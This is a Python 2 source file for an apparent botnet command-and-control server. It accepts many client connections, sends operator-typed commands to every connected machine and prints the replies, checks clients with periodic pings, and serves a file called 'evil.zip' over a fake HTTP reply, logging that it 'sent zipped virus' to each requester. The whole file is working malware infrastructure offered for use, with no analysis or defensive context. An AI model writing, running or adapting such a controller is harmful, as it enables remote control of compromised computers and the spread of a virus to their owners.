import socket
import threading

IP = "0.0.0.0"
CMD_PORT = 12358
ZIP_PORT = 35813
MAX_CONNECTION = 64
MAX_LEN = 2048
IS_ALIVE = "syn"
PING_RATE = 5
ZIP_LOCATION = "C:\\Users\\jhjht\\PycharmProjects\\slave\\evil.zip"

mutex = threading.Lock()
clients = []


def send_zip():
    try:
        zip_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as e:
        print "Error[%d] %s" % (e.errno, e.message)
        print ">",
        return
    try:
        zip_server.bind((IP, ZIP_PORT))
        zip_server.listen(1)
        while True:
            client, address = zip_server.accept()
            fp = open(ZIP_LOCATION, "rb")
            data = fp.read()
            fp.close()
            client.recv(MAX_LEN) # recieve the request
            response = "HTTP/1.1 200 OK\r\n"
            response += "Content-Length: " + str(len(data)) + "\r\n"
            response += "Content-Type: application/zip\r\n\r\n"
            response += data
            client.send(response)
            print "[*] sent zipped virus to %s [*]" % address[0]
            print ">",
            client.close()
    except socket.error as e:
        print "Error[%d] %s" % (e.errno, e.message)
        zip_server.close()
        return


def send_messages():
    print ">",
    while True:
        cmd = raw_input()
        if len(cmd) > MAX_LEN:
            print "{!} The command is too long {!}"
            print ">",
        mutex.acquire()
        for tup in clients:
            client, address = tup
            try:
                client.send(cmd.ljust(MAX_LEN, " "))
                print "%s: %s" % (address[0], client.recv(MAX_LEN))
                print ">",
            except socket.error as e:
                print "[*] %s disconnected from the server (%d) [*]" % (address[0], e.errno)
                print ">",
                client.close()
                clients.remove((client, address))
        mutex.release()


def garbage_collector():
    threading.Timer(PING_RATE, garbage_collector).start()
    # calls timer to make the method execute regularly
    mutex.acquire()
    for tup in clients:
        client, address = tup
        try:
            client.send(IS_ALIVE.ljust(MAX_LEN, " "))
        except socket.error as e:
            print "[*] %s disconnected from the server (%d) [*]" % (address[0], e.errno)
            print ">",
            client.close()
            clients.remove((client, address))
    mutex.release()


def main():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as e:
        print "Error[%d] %s" % (e.errno, e.message)
        return
    try:
        server_socket.bind((IP, CMD_PORT))
        server_socket.listen(MAX_CONNECTION)
        threading.Thread(target=send_messages).start()
        threading.Thread(target=send_zip).start()
        threading.Timer(PING_RATE, garbage_collector).start()
        while True:
            client, address = server_socket.accept()
            mutex.acquire()
            clients.append((client, address))
            mutex.release()
            print "[*] %s connected to the server [*]" % address[0]
            print ">",
    except socket.error as e:
        print "Error[%d] %s" % (e.errno, e.message)
        server_socket.close()
        return


if __name__ == '__main__':
    main()
